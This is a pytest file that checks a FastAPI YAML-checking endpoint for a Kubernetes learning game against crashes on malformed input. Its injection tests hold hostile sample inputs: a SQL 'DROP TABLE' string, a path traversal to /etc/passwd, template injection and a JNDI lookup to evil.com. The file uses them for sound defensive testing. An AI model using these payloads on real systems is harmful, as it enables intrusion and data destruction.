"""QA attack tests for chapters 19-22.

Goal: ensure the /api/check endpoint never crashes (HTTP 500) on bad input,
and that wrong / malformed YAML is consistently rejected.
"""

import pytest
from app.main import app
from fastapi.testclient import TestClient

client = TestClient(app)


def check(level_id, yaml_text):
    """POST to /api/check and assert HTTP 200 (no crash)."""
    r = client.post("/api/check", json={"level_id": level_id, "user_yaml": yaml_text})
    assert r.status_code == 200, f"{level_id} returned HTTP {r.status_code} — CRASH!"
    return r.json()


# Level IDs: Q19.1 .. Q22.5
LEVELS = [f"Q{ch}.{lv}" for ch in range(19, 23) for lv in range(1, 6)]

# Q22.3 and Q22.4 were rewritten from text-input (command) checkers to
# YAML-input (Pod fix) checkers.  A valid Pod YAML is now a correct answer
# for these levels, so they must be excluded from tests that assert a Pod
# YAML is rejected.
POD_ACCEPTING = {"Q22.3", "Q22.4"}
LEVELS_NO_POD = [lv for lv in LEVELS if lv not in POD_ACCEPTING]


# ── Crash / no-500 tests ──────────────────────────────────────────────

class TestCh19Ch22Crash:
    """Ensure no crashes (HTTP 500) on bad input."""

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_empty_yaml(self, level_id):
        d = check(level_id, "")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_garbage(self, level_id):
        d = check(level_id, "this is not yaml at all {{{{")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_null(self, level_id):
        d = check(level_id, "null")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_list_not_dict(self, level_id):
        d = check(level_id, "- item1\n- item2")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_string_not_dict(self, level_id):
        d = check(level_id, "just a string")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_number_input(self, level_id):
        d = check(level_id, "42")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_boolean_input(self, level_id):
        d = check(level_id, "true")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_very_long_input(self, level_id):
        d = check(level_id, "x" * 100_000)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_yaml_bomb(self, level_id):
        # YAML alias bomb — should not hang or crash
        bomb = "a: &a\n  b: &b\n    c: &c\n      d: &d\n          e: &e [*a, *b, *c, *d, *e]"
        d = check(level_id, bomb)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_binary_blob(self, level_id):
        d = check(level_id, "\x00\x01\x02\xff\xfe")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_unicode_chaos(self, level_id):
        d = check(level_id, "🎉🔥💀\n\x1b[31mANSI\x1b[0m\n\u200b\u200c\u200d")
        assert d["ok"] is False


# ── Wrong kind tests ──────────────────────────────────────────────────

class TestCh19Ch22WrongKind:
    @pytest.mark.parametrize("level_id", LEVELS_NO_POD)
    def test_wrong_kind_pod(self, level_id):
        yaml = "apiVersion: v1\nkind: Pod\nmetadata:\n  name: wrong\nspec:\n  containers:\n  - name: x\n    image: nginx\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_wrong_kind_service(self, level_id):
        yaml = "apiVersion: v1\nkind: Service\nmetadata:\n  name: wrong\nspec:\n  selector:\n    app: x\n  ports:\n  - port: 80\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_unknown_kind(self, level_id):
        yaml = "apiVersion: v1\nkind: SomeMadeUpKind\nmetadata:\n  name: x\n"
        d = check(level_id, yaml)
        assert d["ok"] is False


# ── Missing fields tests ──────────────────────────────────────────────

class TestCh19Ch22MissingFields:
    @pytest.mark.parametrize("level_id", LEVELS)
    def test_only_kind(self, level_id):
        yaml = "kind: ConfigMap\nmetadata:\n  name: x\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_empty_dict(self, level_id):
        d = check(level_id, "{}")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_missing_api_version(self, level_id):
        yaml = "kind: ConfigMap\nmetadata:\n  name: x\ndata:\n  key: val\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_missing_metadata(self, level_id):
        yaml = "apiVersion: v1\nkind: ConfigMap\ndata:\n  key: val\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_missing_kind(self, level_id):
        yaml = "apiVersion: v1\nmetadata:\n  name: x\n"
        d = check(level_id, yaml)
        assert d["ok"] is False


# ── Type confusion tests ──────────────────────────────────────────────

class TestCh19Ch22TypeConfusion:
    @pytest.mark.parametrize("level_id", LEVELS)
    def test_containers_as_string(self, level_id):
        yaml = "apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec:\n  containers: notalist\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_spec_as_string(self, level_id):
        yaml = "apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec: hello\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_metadata_as_list(self, level_id):
        yaml = "apiVersion: v1\nkind: Pod\nmetadata:\n- a\n- b\nspec:\n  containers: []\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_api_version_as_int(self, level_id):
        yaml = "apiVersion: 123\nkind: Pod\nmetadata:\n  name: x\n"
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_kind_as_int(self, level_id):
        yaml = "apiVersion: v1\nkind: 42\nmetadata:\n  name: x\n"
        d = check(level_id, yaml)
        assert d["ok"] is False


# ── Multi-doc edge cases ──────────────────────────────────────────────

class TestCh19Ch22MultiDoc:
    @pytest.mark.parametrize("level_id", LEVELS)
    def test_multi_doc_empty(self, level_id):
        d = check(level_id, "---\n---\n---")
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_multi_doc_one_valid(self, level_id):
        yaml = (
            "---\n"
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n  name: x\n"
            "spec:\n  containers:\n  - name: c\n    image: nginx\n"
            "---\n"
            "garbage: {{{\n"
        )
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_doc_separator_only(self, level_id):
        d = check(level_id, "---")
        assert d["ok"] is False


# ── State pollution / idempotency ─────────────────────────────────────

class TestCh19Ch22StatePollution:
    @pytest.mark.parametrize("level_id", LEVELS)
    def test_call_twice_same_result(self, level_id):
        yaml = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n  name: test\n"
            "spec:\n  containers:\n  - name: x\n    image: nginx\n"
        )
        d1 = check(level_id, yaml)
        d2 = check(level_id, yaml)
        assert d1["ok"] == d2["ok"]

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_call_then_garbage_then_call(self, level_id):
        yaml = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n  name: test\n"
            "spec:\n  containers:\n  - name: x\n    image: nginx\n"
        )
        d1 = check(level_id, yaml)
        check(level_id, "garbage {{{")
        d3 = check(level_id, yaml)
        assert d1["ok"] == d3["ok"]


# ── Injection / special characters ────────────────────────────────────

class TestCh19Ch22Injection:
    @pytest.mark.parametrize("level_id", LEVELS_NO_POD)
    def test_sql_injection_in_name(self, level_id):
        yaml = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n  name: \"x'; DROP TABLE levels; --\"\n"
            "spec:\n  containers:\n  - name: c\n    image: nginx\n"
        )
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS_NO_POD)
    def test_path_traversal_in_name(self, level_id):
        yaml = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n  name: \"../../etc/passwd\"\n"
            "spec:\n  containers:\n  - name: c\n    image: nginx\n"
        )
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_template_injection(self, level_id):
        yaml = (
            "apiVersion: v1\n"
            "kind: ConfigMap\n"
            "metadata:\n  name: \"{{7*7}}\"\n"
            "data:\n  key: \"${jndi:ldap://evil.com}\"\n"
        )
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS_NO_POD)
    def test_null_bytes_in_name(self, level_id):
        yaml = (
            "apiVersion: v1\n"
            "kind: Pod\n"
            'metadata:\n  name: "hello\x00world"\n'
            "spec:\n  containers:\n  - name: c\n    image: nginx\n"
        )
        d = check(level_id, yaml)
        assert d["ok"] is False


# ── Deeply nested structures ──────────────────────────────────────────

class TestCh19Ch22DeepNesting:
    @pytest.mark.parametrize("level_id", LEVELS)
    def test_deep_nesting_50(self, level_id):
        yaml = "a:\n" + "".join(f"{'  ' * i}b:\n" for i in range(1, 50))
        d = check(level_id, yaml)
        assert d["ok"] is False

    @pytest.mark.parametrize("level_id", LEVELS)
    def test_many_list_items(self, level_id):
        yaml = "\n".join(f"- item{i}" for i in range(10_000))
        d = check(level_id, yaml)
        assert d["ok"] is False
